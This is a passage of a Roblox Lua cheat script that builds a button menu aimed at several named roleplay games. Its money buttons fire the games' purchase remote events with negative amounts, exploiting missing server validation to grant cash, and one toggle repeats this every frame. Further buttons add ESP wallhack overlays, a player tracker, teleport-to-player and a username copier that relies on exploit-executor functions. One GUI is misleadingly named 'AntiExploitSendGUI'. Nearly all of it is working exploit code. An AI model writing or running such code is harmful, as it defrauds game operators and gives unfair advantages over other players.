moneyLabel.Font = Enum.Font.GothamBold
moneyLabel.TextSize = 20
moneyLabel.TextXAlignment = Enum.TextXAlignment.Left
moneyLabel.Parent = frame

-- CASH Button (White bg, black text)
local cashButton = Instance.new("TextButton")
cashButton.Size = UDim2.new(0, 80,0,30)
cashButton.Position = UDim2.new(1, -90, 1, -38)
cashButton.BackgroundColor3 = Color3.new(1,1,1)  -- White
cashButton.Text = "CASH"
cashButton.TextColor3 = Color3.new(0,0,0)  -- Black text
cashButton.Font = Enum.Font.GothamBold
cashButton.TextSize = 14
cashButton.Parent = frame

Instance.new("UICorner", cashButton).CornerRadius = UDim.new(0, 8)

-- Toggle Switch (White/Gray lang)
local toggleFrame = Instance.new("Frame")
toggleFrame.Size = UDim2.new(0,40,0,20)
toggleFrame.Position = UDim2.new(0,10,1,-30)
toggleFrame.BackgroundColor3 = Color3.fromRGB(220,220,220)
toggleFrame.Parent = frame
Instance.new("UICorner", toggleFrame).CornerRadius = UDim.new(0,10)

local toggleButton = Instance.new("Frame")
toggleButton.Size = UDim2.new(0,16,0,16)
toggleButton.Position = UDim2.new(0,2,0.5,-8)
toggleButton.BackgroundColor3 = Color3.new(1,1,1)
toggleButton.Parent = toggleFrame
Instance.new("UICorner", toggleButton).CornerRadius = UDim.new(0,8)

-- Draggable (same pa rin)
local dragging, dragInput, dragStart, startPos
frame.InputBegan:Connect(function(input)
	if input.UserInputType == Enum.UserInputType.MouseButton1 then
		dragging = true
		dragStart = input.Position
		startPos = frame.Position
		input.Changed:Connect(function()
			if input.UserInputState == Enum.UserInputState.End then dragging = false end
		end)
	end
end)
frame.InputChanged:Connect(function(input)
	if input.UserInputType == Enum.UserInputType.MouseMovement then
		dragInput = input
	end
end)
RunService.RenderStepped:Connect(function()
	if dragging and dragInput then
		local delta = dragInput.Position - dragStart
		frame.Position = UDim2.new(startPos.X.Scale, startPos.X.Offset + delta.X, startPos.Y.Scale, startPos.Y.Offset + delta.Y)
	end
end)

-- Toggle Logic
local isOn = false
local connection

toggleFrame.InputBegan:Connect(function(input)
	if input.UserInputType == Enum.UserInputType.MouseButton1 then
		isOn = not isOn
		if isOn then
			toggleButton.Position = UDim2.new(1, -18, 0.5, -8)
			toggleFrame.BackgroundColor3 = Color3.fromRGB(200,200,200)  -- Light gray when ON
		else
			toggleButton.Position = UDim2.new(0, 2, 0.5, -8)
			toggleFrame.BackgroundColor3 = Color3.fromRGB(220,220,220)
		end

		if isOn then
			connection = RunService.Heartbeat:Connect(function()
				if ReplicatedStorage:FindFirstChild("GiveAyuda") then
					ReplicatedStorage.GiveAyuda:FireServer("Combat Pistol", -1)
				end
			end)
		else
			if connection then connection:Disconnect() end
		end
	end
end)

-- CASH Button
cashButton.MouseButton1Click:Connect(function()
	if ReplicatedStorage:FindFirstChild("GiveAyuda") then
		ReplicatedStorage.GiveAyuda:FireServer("Combat Pistol", -1)
	end
end)

-- Update Money
task.spawn(function()
	local stats = player:WaitForChild("leaderstats")
	local cash = stats:FindFirstChild("Cash") or stats:FindFirstChild("Money")
	if cash then
		moneyLabel.Text = "$"..cash.Value
		cash.Changed:Connect(function()
			moneyLabel.Text = "$"..cash.Value
		end)
	end
end)
end)

addMainMenuButton("PROMINENCE CITY S1 (MONSY)", function()
    --// Services
local Players = game:GetService("Players")
local ReplicatedStorage = game:GetService("ReplicatedStorage")

local player = Players.LocalPlayer

--// GUI Setup
local gui = Instance.new("ScreenGui")
gui.Name = "AntiExploitSendGUI"
gui.ResetOnSpawn = false
gui.Parent = player:WaitForChild("PlayerGui")

local frame = Instance.new("Frame")
frame.Size = UDim2.new(0, 300, 0, 165)
frame.Position = UDim2.new(0.5, -150, 0.5, -82.5)
frame.BackgroundColor3 = Color3.fromRGB(255,255,255)
frame.BorderSizePixel = 0
frame.Parent = gui
frame.Active = true
frame.Draggable = true
Instance.new("UICorner", frame).CornerRadius = UDim.new(0, 10)

--// Title
local title = Instance.new("TextLabel")
title.Size = UDim2.new(1, 0, 0, 40)
title.Position = UDim2.new(0, 0, 0, 0)
title.BackgroundColor3 = Color3.fromRGB(255,255,255)
title.Text = "PUBLIC ENEMY CASH MENU"
title.TextColor3 = Color3.fromRGB(0,0,0)
title.Font = Enum.Font.GothamBold
title.TextSize = 16
title.Parent = frame
Instance.new("UICorner", title).CornerRadius = UDim.new(0, 8)

--// Amount TextBox
local amountBox = Instance.new("TextBox")
amountBox.Size = UDim2.new(1, -20, 0, 35)
amountBox.Position = UDim2.new(0, 10, 0, 50)
amountBox.PlaceholderText = "Enter Amount"
amountBox.PlaceholderColor3 = Color3.fromRGB(100, 100, 100)
amountBox.BackgroundColor3 = Color3.fromRGB(255,255,255)
amountBox.TextColor3 = Color3.fromRGB(0,0,0)
amountBox.Font = Enum.Font.Gotham
amountBox.TextSize = 14
amountBox.Parent = frame
Instance.new("UICorner", amountBox).CornerRadius = UDim.new(0, 6)

--// Send Button
local sendButton = Instance.new("TextButton")
sendButton.Size = UDim2.new(1, -20, 0, 40)
sendButton.Position = UDim2.new(0, 10, 0, 100)
sendButton.Text = "Send"
sendButton.BackgroundColor3 = Color3.fromRGB(255,255,255)
sendButton.TextColor3 = Color3.fromRGB(0,0,0)
sendButton.Font = Enum.Font.GothamBold
sendButton.TextSize = 16
sendButton.Parent = frame
Instance.new("UICorner", sendButton).CornerRadius = UDim.new(0, 6)

--// Send Logic
sendButton.MouseButton1Click:Connect(function()
    local amount = tonumber(amountBox.Text)
    if amount then
        game:GetService("ReplicatedStorage").BuyToolEvent:FireServer("Calisto Pistol", -amount)
    else
        warn("Invalid amount!")
    end
end)
end)

addMainMenuButton("CAVITE ROLEPLAY (MONSY)", function()
        --// Services
local Players = game:GetService("Players")
local ReplicatedStorage = game:GetService("ReplicatedStorage")

local player = Players.LocalPlayer

--// GUI Setup
local gui = Instance.new("ScreenGui")
gui.Name = "AntiExploitSendGUI"
gui.ResetOnSpawn = false
gui.Parent = player:WaitForChild("PlayerGui")

local frame = Instance.new("Frame")
frame.Size = UDim2.new(0, 300, 0, 165)
frame.Position = UDim2.new(0.5, -150, 0.5, -82.5)
frame.BackgroundColor3 = Color3.fromRGB(255,255,255)
frame.BorderSizePixel = 0
frame.Parent = gui
frame.Active = true
frame.Draggable = true
Instance.new("UICorner", frame).CornerRadius = UDim.new(0, 10)

--// Title
local title = Instance.new("TextLabel")
title.Size = UDim2.new(1, 0, 0, 40)
title.Position = UDim2.new(0, 0, 0, 0)
title.BackgroundColor3 = Color3.fromRGB(255,255,255)
title.Text = "PUBLIC ENEMY CASH MENU"
title.TextColor3 = Color3.fromRGB(0,0,0)
title.Font = Enum.Font.GothamBold
title.TextSize = 16
title.Parent = frame
Instance.new("UICorner", title).CornerRadius = UDim.new(0, 8)

--// Amount TextBox
local amountBox = Instance.new("TextBox")
amountBox.Size = UDim2.new(1, -20, 0, 35)
amountBox.Position = UDim2.new(0, 10, 0, 50)
amountBox.PlaceholderText = "Enter Amount"
amountBox.PlaceholderColor3 = Color3.fromRGB(100, 100, 100)
amountBox.BackgroundColor3 = Color3.fromRGB(255,255,255)
amountBox.TextColor3 = Color3.fromRGB(0,0,0)
amountBox.Font = Enum.Font.Gotham
amountBox.TextSize = 14
amountBox.Parent = frame
Instance.new("UICorner", amountBox).CornerRadius = UDim.new(0, 6)

--// Send Button
local sendButton = Instance.new("TextButton")
sendButton.Size = UDim2.new(1, -20, 0, 40)
sendButton.Position = UDim2.new(0, 10, 0, 100)
sendButton.Text = "Send"
sendButton.BackgroundColor3 = Color3.fromRGB(255,255,255)
sendButton.TextColor3 = Color3.fromRGB(0,0,0)
sendButton.Font = Enum.Font.GothamBold
sendButton.TextSize = 16
sendButton.Parent = frame
Instance.new("UICorner", sendButton).CornerRadius = UDim.new(0, 6)

--// Send Logic
sendButton.MouseButton1Click:Connect(function()
    local amount = tonumber(amountBox.Text)
    if amount then
        game:GetService("ReplicatedStorage").GunShop.Events.Purchase:FireServer("Silenced Pistol", -amount)
    else
        warn("Invalid amount!")
    end
end)
end)

addMainMenuButton("URBAN CITY V3 (MONSY)", function()
        --// Services
local Players = game:GetService("Players")
local ReplicatedStorage = game:GetService("ReplicatedStorage")

local player = Players.LocalPlayer

--// GUI Setup
local gui = Instance.new("ScreenGui")
gui.Name = "AntiExploitSendGUI"
gui.ResetOnSpawn = false
gui.Parent = player:WaitForChild("PlayerGui")

local frame = Instance.new("Frame")
frame.Size = UDim2.new(0, 300, 0, 165)
frame.Position = UDim2.new(0.5, -150, 0.5, -82.5)
frame.BackgroundColor3 = Color3.fromRGB(255,255,255)
frame.BorderSizePixel = 0
frame.Parent = gui
frame.Active = true
frame.Draggable = true
Instance.new("UICorner", frame).CornerRadius = UDim.new(0, 10)

--// Title
local title = Instance.new("TextLabel")
title.Size = UDim2.new(1, 0, 0, 40)
title.Position = UDim2.new(0, 0, 0, 0)
title.BackgroundColor3 = Color3.fromRGB(255,255,255)
title.Text = "PUBLIC ENEMY CASH MENU"
title.TextColor3 = Color3.fromRGB(0,0,0)
title.Font = Enum.Font.GothamBold
title.TextSize = 16
title.Parent = frame
Instance.new("UICorner", title).CornerRadius = UDim.new(0, 8)

--// Amount TextBox
local amountBox = Instance.new("TextBox")
amountBox.Size = UDim2.new(1, -20, 0, 35)
amountBox.Position = UDim2.new(0, 10, 0, 50)
amountBox.PlaceholderText = "Enter Amount"
amountBox.PlaceholderColor3 = Color3.fromRGB(100, 100, 100)
amountBox.BackgroundColor3 = Color3.fromRGB(255,255,255)
amountBox.TextColor3 = Color3.fromRGB(0,0,0)
amountBox.Font = Enum.Font.Gotham
amountBox.TextSize = 14
amountBox.Parent = frame
Instance.new("UICorner", amountBox).CornerRadius = UDim.new(0, 6)

--// Send Button
local sendButton = Instance.new("TextButton")
sendButton.Size = UDim2.new(1, -20, 0, 40)
sendButton.Position = UDim2.new(0, 10, 0, 100)
sendButton.Text = "Send"
sendButton.BackgroundColor3 = Color3.fromRGB(255,255,255)
sendButton.TextColor3 = Color3.fromRGB(0,0,0)
sendButton.Font = Enum.Font.GothamBold
sendButton.TextSize = 16
sendButton.Parent = frame
Instance.new("UICorner", sendButton).CornerRadius = UDim.new(0, 6)

--// Send Logic
sendButton.MouseButton1Click:Connect(function()
    local amount = tonumber(amountBox.Text)
    if amount then
        game:GetService("ReplicatedStorage").UwUCafeFolder.BuyTool:FireServer("Prime", -amount)
    else
        warn("Invalid amount!")
    end
end)
end)

local function addMainMenuButton(text, callback)
	local panel = allTabPanels["PLAYER MENU"]
	if not panel then return end
	local btn = new("TextButton", {
		Size = UDim2.new(1, -16, 0, 38),
		BackgroundColor3 = Color3.fromRGB(255,255,255),
		TextColor3 = Color3.new(0,0,0),
		Font = Enum.Font.GothamSemibold,
		TextSize = 14,
		Text = text,
		AutoButtonColor = false,
		Parent = panel,
	})
	new("UICorner", {CornerRadius = UDim.new(0,6), Parent = btn})
	btn.MouseEnter:Connect(function()
		TweenService:Create(btn, TweenInfo.new(0.2), {BackgroundColor3 = Color3.fromRGB(20,20,20)}):Play()
	end)
	btn.MouseLeave:Connect(function()
		TweenService:Create(btn, TweenInfo.new(0.2), {BackgroundColor3 = Color3.fromRGB(255,255,255)}):Play()
	end)
	btn.MouseButton1Click:Connect(function()
		clickSound:Play()
		callback()
	end)
end

--// 4 Buttons in Roleplay Script
addMainMenuButton("PLAYER SCANNER (MONSY)", function()
	--// PUBLIC ENEMY PLAYER SCANNER
-- Solid black GUI + Modern font + Hover effects + Click animations + Working VIEW/UNVIEW/TELEPORT

local Players = game:GetService("Players")
local LocalPlayer = Players.LocalPlayer
local UIS = game:GetService("UserInputService")

-- Main ScreenGui
local ScreenGui = Instance.new("ScreenGui")
ScreenGui.Parent = LocalPlayer:WaitForChild("PlayerGui")
ScreenGui.ResetOnSpawn = false

-- Main Frame
local MainFrame = Instance.new("Frame")
MainFrame.Size = UDim2.new(0, 350, 0, 400)
MainFrame.Position = UDim2.new(0.5, -175, 0.5, -200)
MainFrame.BackgroundColor3 = Color3.fromRGB(255,255,255)
MainFrame.BorderSizePixel = 0
MainFrame.Visible = true
MainFrame.Active = true
MainFrame.Draggable = true
MainFrame.Parent = ScreenGui

-- UI Corner
local MainCorner = Instance.new("UICorner")
MainCorner.CornerRadius = UDim.new(0, 8)
MainCorner.Parent = MainFrame

-- Title
local Title = Instance.new("TextLabel")
Title.Size = UDim2.new(1, 0, 0, 40)
Title.BackgroundTransparency = 1
Title.Text = "PUBLIC ENEMY PLAYER SCANNER"
Title.TextColor3 = Color3.fromRGB(0,0,0)
Title.Font = Enum.Font.GothamBold
Title.TextSize = 20
Title.Parent = MainFrame

-- Scan Button
local ScanButton = Instance.new("TextButton")
ScanButton.Size = UDim2.new(0.9, 0, 0, 35)
ScanButton.Position = UDim2.new(0.05, 0, 0, 50)
ScanButton.BackgroundColor3 = Color3.fromRGB(255,255,255)
ScanButton.TextColor3 = Color3.fromRGB(0,0,0)
ScanButton.Font = Enum.Font.GothamBold
ScanButton.TextSize = 18
ScanButton.Text = "SCAN"
ScanButton.AutoButtonColor = false
ScanButton.Parent = MainFrame

local ScanCorner = Instance.new("UICorner")
ScanCorner.CornerRadius = UDim.new(0, 6)
ScanCorner.Parent = ScanButton

-- Hover effect
local function AddHoverEffect(button)
	button.MouseEnter:Connect(function()
		button.BackgroundColor3 = Color3.fromRGB(30, 30, 30)
	end)
	button.MouseLeave:Connect(function()
		button.BackgroundColor3 = Color3.fromRGB(255,255,255)
	end)
	button.MouseButton1Click:Connect(function()
		button.BackgroundColor3 = Color3.fromRGB(50, 50, 50)
		task.wait(0.1)
		button.BackgroundColor3 = Color3.fromRGB(255,255,255)
	end)
end
AddHoverEffect(ScanButton)

-- Scrollable Player List
local PlayerListFrame = Instance.new("ScrollingFrame")
PlayerListFrame.Size = UDim2.new(0.9, 0, 0, 280)
PlayerListFrame.Position = UDim2.new(0.05, 0, 0, 90)
PlayerListFrame.BackgroundTransparency = 1
PlayerListFrame.BorderSizePixel = 0
PlayerListFrame.ScrollBarThickness = 6
PlayerListFrame.ScrollBarImageColor3 = Color3.fromRGB(0, 0, 0)
PlayerListFrame.Parent = MainFrame

local UIListLayout = Instance.new("UIListLayout")
UIListLayout.Parent = PlayerListFrame
UIListLayout.SortOrder = Enum.SortOrder.LayoutOrder
UIListLayout.Padding = UDim.new(0, 4)

-- Function to create each player entry
local function CreatePlayerButton(player)
	local PlayerButton = Instance.new("TextButton")
	PlayerButton.Size = UDim2.new(1, 0, 0, 30)
	PlayerButton.BackgroundColor3 = Color3.fromRGB(20, 20, 20)
	PlayerButton.TextColor3 = Color3.fromRGB(0,0,0)
	PlayerButton.Font = Enum.Font.Gotham
	PlayerButton.TextSize = 16
	PlayerButton.Text = player.DisplayName .. " (@" .. player.Name .. ")"
	PlayerButton.AutoButtonColor = false
	PlayerButton.Parent = PlayerListFrame

	local PlayerCorner = Instance.new("UICorner")
	PlayerCorner.CornerRadius = UDim.new(0, 6)
	PlayerCorner.Parent = PlayerButton

	AddHoverEffect(PlayerButton)

	-- Actions Frame
	local ActionsFrame = Instance.new("Frame")
	ActionsFrame.Size = UDim2.new(1, 0, 0, 30)
	ActionsFrame.BackgroundTransparency = 1
	ActionsFrame.Visible = false
	ActionsFrame.Parent = PlayerListFrame

	local function CreateActionButton(text)
		local Btn = Instance.new("TextButton")
		Btn.Size = UDim2.new(0.3, 0, 1, 0)
		Btn.BackgroundColor3 = Color3.fromRGB(255,255,255)
		Btn.TextColor3 = Color3.fromRGB(0,0,0)
		Btn.Font = Enum.Font.GothamBold
		Btn.TextSize = 14
		Btn.Text = text
		Btn.AutoButtonColor = false
		Btn.Parent = ActionsFrame

		local BtnCorner = Instance.new("UICorner")
		BtnCorner.CornerRadius = UDim.new(0, 6)
		BtnCorner.Parent = Btn

		AddHoverEffect(Btn)
		return Btn
	end

	local ViewBtn = CreateActionButton("VIEW")
	local UnviewBtn = CreateActionButton("UNVIEW")
	local TeleportBtn = CreateActionButton("TELEPORT")

	ViewBtn.Position = UDim2.new(0, 0, 0, 0)
	UnviewBtn.Position = UDim2.new(0.35, 0, 0, 0)
	TeleportBtn.Position = UDim2.new(0.7, 0, 0, 0)

	-- === BUTTON FUNCTIONS ===
	ViewBtn.MouseButton1Click:Connect(function()
		if player.Character and player.Character:FindFirstChild("Head") then
			workspace.CurrentCamera.CameraSubject = player.Character:FindFirstChild("Head")
		end
	end)

	UnviewBtn.MouseButton1Click:Connect(function()
		if LocalPlayer.Character and LocalPlayer.Character:FindFirstChild("Humanoid") then
			workspace.CurrentCamera.CameraSubject = LocalPlayer.Character:FindFirstChild("Humanoid")
		end
	end)

	TeleportBtn.MouseButton1Click:Connect(function()
		if player.Character and player.Character:FindFirstChild("HumanoidRootPart") and
		   LocalPlayer.Character and LocalPlayer.Character:FindFirstChild("HumanoidRootPart") then
			LocalPlayer.Character.HumanoidRootPart.CFrame =
				player.Character.HumanoidRootPart.CFrame + Vector3.new(2, 0, 0)
		end
	end)

	-- Show/hide action buttons
	PlayerButton.MouseButton1Click:Connect(function()
		ActionsFrame.Visible = not ActionsFrame.Visible
	end)
end

-- SCAN function
ScanButton.MouseButton1Click:Connect(function()
	for _, child in ipairs(PlayerListFrame:GetChildren()) do
		if child:IsA("TextButton") or child:IsA("Frame") then
			child:Destroy()
		end
	end

	task.spawn(function()
		for _, player in ipairs(Players:GetPlayers()) do
			if player ~= LocalPlayer then
				CreatePlayerButton(player)
				task.wait(0.15)
			end
		end
	end)
end)

-- Hide/Unhide with U
UIS.InputBegan:Connect(function(input, gp)
	if not gp and input.KeyCode == Enum.KeyCode.U then
		MainFrame.Visible = not MainFrame.Visible
	end
end)
end)

--// 4 Buttons in Roleplay Script
addMainMenuButton("USERNAME COPIER (MONSY)", function()
	-- Sleek Black Player Scanner GUI (Medium Version with Smooth Refresh Animation)
-- All-black draggable GUI listing player usernames. Click to copy username.
-- Use 'M' key to toggle visibility.

local Players = game:GetService("Players")
local StarterGui = game:GetService("StarterGui")
local TweenService = game:GetService("TweenService")
local LocalPlayer = Players.LocalPlayer

-- Create ScreenGui
local screenGui = Instance.new("ScreenGui")
screenGui.Name = "PlayerScannerGUI"
screenGui.ResetOnSpawn = false
screenGui.Parent = LocalPlayer:WaitForChild("PlayerGui")

-- Main frame (medium black window)
local mainFrame = Instance.new("Frame")
mainFrame.Name = "Main"
mainFrame.AnchorPoint = Vector2.new(0.5, 0.5)
mainFrame.Position = UDim2.new(0.5, 0, 0.5, 0)
mainFrame.Size = UDim2.new(0, 300, 0, 340)
mainFrame.BackgroundColor3 = Color3.fromRGB(255,255,255)
mainFrame.BorderSizePixel = 0
mainFrame.Parent = screenGui
mainFrame.Active = true
mainFrame.Draggable = true

local corner = Instance.new("UICorner")
corner.CornerRadius = UDim.new(0, 10)
corner.Parent = mainFrame

-- Title
local title = Instance.new("TextLabel")
title.Name = "Title"
title.Size = UDim2.new(1, 0, 0, 34)
title.BackgroundTransparency = 1
title.Text = "USERNAME COPIER"
title.TextColor3 = Color3.fromRGB(0,0,0)
title.Font = Enum.Font.GothamBold
title.TextSize = 18
title.Parent = mainFrame

-- Close button
local closeBtn = Instance.new("TextButton")
closeBtn.Name = "Close"
closeBtn.Size = UDim2.new(0, 26, 0, 26)
closeBtn.Position = UDim2.new(1, -32, 0, 4)
closeBtn.BackgroundColor3 = Color3.fromRGB(255,255,255)
closeBtn.BorderSizePixel = 0
closeBtn.Text = "✕"
closeBtn.TextColor3 = Color3.fromRGB(0,0,0)
closeBtn.Font = Enum.Font.GothamBold
closeBtn.TextSize = 16
closeBtn.Parent = mainFrame
closeBtn.MouseButton1Click:Connect(function()
	screenGui.Enabled = false
end)

-- Refresh Button
local refreshBtn = Instance.new("TextButton")
refreshBtn.Name = "Refresh"
refreshBtn.Size = UDim2.new(0, 100, 0, 28)
refreshBtn.Position = UDim2.new(0, 8, 0, 40)
refreshBtn.BackgroundColor3 = Color3.fromRGB(255,255,255)
refreshBtn.BorderSizePixel = 1
refreshBtn.BorderColor3 = Color3.fromRGB(25, 25, 25)
refreshBtn.Text = "REFRESH"
refreshBtn.TextColor3 = Color3.fromRGB(0,0,0)
refreshBtn.Font = Enum.Font.GothamBold
refreshBtn.TextSize = 13
refreshBtn.Parent = mainFrame

local refreshCorner = Instance.new("UICorner")
refreshCorner.CornerRadius = UDim.new(0, 6)
refreshCorner.Parent = refreshBtn

-- Scrolling player list
local scroll = Instance.new("ScrollingFrame")
scroll.Name = "PlayerList"
scroll.Position = UDim2.new(0, 8, 0, 74)
scroll.Size = UDim2.new(1, -16, 1, -82)
scroll.BackgroundTransparency = 1
scroll.BorderSizePixel = 0
scroll.ScrollBarThickness = 4
scroll.CanvasSize = UDim2.new(0, 0, 0, 0)
scroll.Parent = mainFrame

local uiList = Instance.new("UIListLayout")
uiList.Padding = UDim.new(0, 5)
uiList.SortOrder = Enum.SortOrder.LayoutOrder
uiList.Parent = scroll

local uiPadding = Instance.new("UIPadding")
uiPadding.PaddingTop = UDim.new(0, 6)
uiPadding.PaddingLeft = UDim.new(0, 6)
uiPadding.PaddingRight = UDim.new(0, 6)
uiPadding.PaddingBottom = UDim.new(0, 6)
uiPadding.Parent = scroll

-- Notification helper
local function notify(titleText, text)
	pcall(function()
		StarterGui:SetCore("SendNotification", {
			Title = titleText or "Notice",
			Text = text or "",
			Duration = 2
		})
	end)
end

-- Create player button
local function makePlayerButton(plr)
	local btn = Instance.new("TextButton")
	btn.Name = plr.Name
	btn.Size = UDim2.new(1, -4, 0, 28)
	btn.BackgroundColor3 = Color3.fromRGB(255,255,255)
	btn.BorderSizePixel = 1
	btn.BorderColor3 = Color3.fromRGB(25, 25, 25)
	btn.Text = plr.Name
	btn.TextColor3 = Color3.fromRGB(0,0,0)
	btn.Font = Enum.Font.Gotham
	btn.TextSize = 15
	btn.BackgroundTransparency = 1
	btn.TextTransparency = 1
	btn.Parent = scroll

	local corner = Instance.new("UICorner")
	corner.CornerRadius = UDim.new(0, 6)
	corner.Parent = btn

	TweenService:Create(btn, TweenInfo.new(0.25), {BackgroundTransparency = 0, TextTransparency = 0}):Play()

	btn.MouseButton1Click:Connect(function()
		local username = plr.Name
		local success, err = pcall(function()
			if setclipboard then
				setclipboard(username)
				notify("Copied", username .. " copied!")
			else
				error("no setclipboard")
			end
		end)
		if not success then
			notify("Manual Copy", username .. " (setclipboard not supported)")
		end
	end)
end

-- Smooth refresh with fade effect
local function refreshList()
	-- Fade out existing buttons
	for _, child in ipairs(scroll:GetChildren()) do
		if child:IsA("TextButton") then
			TweenService:Create(child, TweenInfo.new(0.15), {TextTransparency = 1, BackgroundTransparency = 1}):Play()
		end
	end
	task.wait(0.15)

	-- Clear old buttons
	for _, child in ipairs(scroll:GetChildren()) do
		if child:IsA("TextButton") then child:Destroy() end
	end

	-- Add new player buttons
	for _, plr in ipairs(Players:GetPlayers()) do
		if plr ~= LocalPlayer then
			makePlayerButton(plr)
		end
	end

	local total = #Players:GetPlayers() * 32
	scroll.CanvasSize = UDim2.new(0, 0, 0, total)
	notify("Refreshed", "Player list updated")
end

refreshBtn.MouseButton1Click:Connect(refreshList)
Players.PlayerAdded:Connect(refreshList)
Players.PlayerRemoving:Connect(refreshList)
refreshList()

-- Toggle with M key
local UIS = game:GetService("UserInputService")
UIS.InputBegan:Connect(function(input, gp)
	if gp then return end
	if input.KeyCode == Enum.KeyCode.M then
		screenGui.Enabled = not screenGui.Enabled
	end
end)

screenGui.Enabled = true
end)

--// 4 Buttons in Roleplay Script
addMainMenuButton("TRACK ALL MUSCLE T TO OPEN / OFF (MONSY)", function()
  --// Player Tracker + NameTag Display | Toggle with T key (FINAL FIXED VERSION)

local Players = game:GetService("Players")
local RunService = game:GetService("RunService")
local UserInputService = game:GetService("UserInputService")
local LocalPlayer = Players.LocalPlayer

repeat wait() until LocalPlayer.Character and LocalPlayer.Character:FindFirstChild("HumanoidRootPart")

local trackingEnabled = false
local lines = {}
local nameTags = {}
local connections = {}
local renderConnection

-- Clean ESP for a single player
local function removeESP(player)
	if lines[player] then
		lines[player]:Destroy()
		lines[player] = nil
	end
	if nameTags[player] then
		nameTags[player]:Destroy()
		nameTags[player] = nil
	end
end

-- Create ESP for a player
local function createESP(player)
	if player == LocalPlayer then return end

	local function setup()
		removeESP(player)

		local character = player.Character
		if not character then return end

		local hrp = character:FindFirstChild("HumanoidRootPart")
		local head = character:FindFirstChild("Head")
		if not hrp or not head then return end

		-- Line
		local line = Instance.new("Part")
		line.Anchored = true
		line.CanCollide = false
		line.Color = Color3.new(1, 1, 1)
		line.Material = Enum.Material.Neon
		line.Transparency = 0
		line.Size = Vector3.new(0.1, 0.1, 1)
		line.Name = "ESP_Line_" .. player.Name
		line.Parent = workspace
		lines[player] = line

		-- NameTag
		local billboard = Instance.new("BillboardGui")
		billboard.Name = "NameTag"
		billboard.Size = UDim2.new(0, 100, 0, 30)
		billboard.StudsOffset = Vector3.new(0, 2.2, 0)
		billboard.AlwaysOnTop = true
		billboard.Adornee = head

		local textLabel = Instance.new("TextLabel")
		textLabel.Size = UDim2.new(1, 0, 1, 0)
		textLabel.BackgroundTransparency = 1
		textLabel.Text = player.DisplayName .. "\n(" .. player.Name .. ")"
		textLabel.TextColor3 = Color3.new(1, 1, 1)
		textLabel.TextStrokeTransparency = 0.4
		textLabel.Font = Enum.Font.SourceSansBold
		textLabel.TextScaled = true
		textLabel.Parent = billboard

		billboard.Parent = head
		nameTags[player] = billboard
	end

	if player.Character then
		setup()
	end

	local conn = player.CharacterAdded:Connect(function()
		wait(1)
		setup()
	end)
	table.insert(connections, conn)
end

-- Update all lines every frame
local function updateESP()
	local origin = LocalPlayer.Character and LocalPlayer.Character:FindFirstChild("HumanoidRootPart")
	if not origin then return end

	for player, line in pairs(lines) do
		local target = player.Character and player.Character:FindFirstChild("HumanoidRootPart")
		if target and target:IsDescendantOf(workspace) then
			local direction = target.Position - origin.Position
			local distance = direction.Magnitude
			line.Size = Vector3.new(0.1, 0.1, distance)
			line.CFrame = CFrame.new(origin.Position, target.Position) * CFrame.new(0, 0, -distance / 2)
		else
			-- Remove broken line
			removeESP(player)
		end
	end
end

-- Clear everything
local function clearESP()
	for _, line in pairs(lines) do
		if line then line:Destroy() end
	end
	for _, tag in pairs(nameTags) do
		if tag then tag:Destroy() end
	end
	for _, conn in ipairs(connections) do
		if conn then conn:Disconnect() end
	end
	if renderConnection then
		renderConnection:Disconnect()
	end

	lines = {}
	nameTags = {}
	connections = {}
	renderConnection = nil
end

-- Toggle ESP
local function toggleESP()
	trackingEnabled = not trackingEnabled

	if trackingEnabled then
		warn("📡 ESP ON")

		for _, player in ipairs(Players:GetPlayers()) do
			createESP(player)
		end

		local playerAddedConn = Players.PlayerAdded:Connect(function(player)
			createESP(player)
		end)
		table.insert(connections, playerAddedConn)

		renderConnection = RunService.RenderStepped:Connect(updateESP)
	else
		warn("📴 ESP OFF")
		clearESP()
	end
end

-- Keybind (T)
UserInputService.InputBegan:Connect(function(input, gameProcessed)
	if gameProcessed then return end
	if input.KeyCode == Enum.KeyCode.T then
		toggleESP()
	end
end)

warn("🔁 Press [T] to toggle Player Tracker with Clean ESP.")
end)

addMainMenuButton("ESP (MONSY)", function()
	--// Services
local Players = game:GetService("Players")
local RunService = game:GetService("RunService")
local Camera = workspace.CurrentCamera
local LocalPlayer = Players.LocalPlayer

--// GUI Setup
local gui = Instance.new("ScreenGui")
gui.Name = "ESP_Toggle_GUI"
gui.ResetOnSpawn = false
gui.Parent = LocalPlayer:WaitForChild("PlayerGui")

local toggleButton = Instance.new("TextButton")
toggleButton.Size = UDim2.new(0, 100, 0, 35)
toggleButton.Position = UDim2.new(0, 20, 0, 120)
toggleButton.BackgroundColor3 = Color3.fromRGB(255,255,255)
toggleButton.TextColor3 = Color3.fromRGB(0,0,0)
toggleButton.Text = "ESP: ON"
toggleButton.Font = Enum.Font.GothamBold
toggleButton.TextSize = 14
toggleButton.Parent = gui

local corner = Instance.new("UICorner", toggleButton)
corner.CornerRadius = UDim.new(0, 6)

--// Toggle State
local ESP_ENABLED = true
local ESPObjects = {}

--// Drawing Helpers
local function newLine()
	local line = Drawing.new("Line")
	line.Thickness = 2
	line.Color = Color3.fromRGB(255, 255, 255) -- Changed to white
	line.Visible = true
	return line
end

local function newText()
	local text = Drawing.new("Text")
	text.Size = 14
	text.Color = Color3.fromRGB(255, 255, 255)
	text.Center = true
	text.Outline = true
	text.Visible = true
	return text
end

local function clearESP(player)
	if ESPObjects[player] then
		for _, obj in pairs(ESPObjects[player]) do
			if obj.Remove then obj:Remove() end
		end
		ESPObjects[player] = nil
	end
end

--// Get 2D screen position of 3D part
local function getPartPos(part)
	if not part then return nil, false end
	local pos, visible = Camera:WorldToViewportPoint(part.Position)
	return Vector2.new(pos.X, pos.Y), visible
end

--// ESP Rendering
RunService.RenderStepped:Connect(function()
	if not ESP_ENABLED then
		for _, v in pairs(ESPObjects) do
			for _, obj in pairs(v) do
				obj.Visible = false
			end
		end
		return
	end

	for _, player in ipairs(Players:GetPlayers()) do
		if player ~= LocalPlayer and player.Character then
			local char = player.Character
			local esp = ESPObjects[player]

			if not esp then
				esp = {
					HeadToTorso = newLine(),
					TorsoToLeftArm = newLine(),
					TorsoToRightArm = newLine(),
					TorsoToLeftLeg = newLine(),
					TorsoToRightLeg = newLine(),
					Name = newText(),
				}
				ESPObjects[player] = esp
			end

			local headPos, headVis = getPartPos(char:FindFirstChild("Head"))
			local torsoPos, torsoVis = getPartPos(char:FindFirstChild("HumanoidRootPart"))
			local laPos, laVis = getPartPos(char:FindFirstChild("LeftUpperArm") or char:FindFirstChild("Left Arm"))
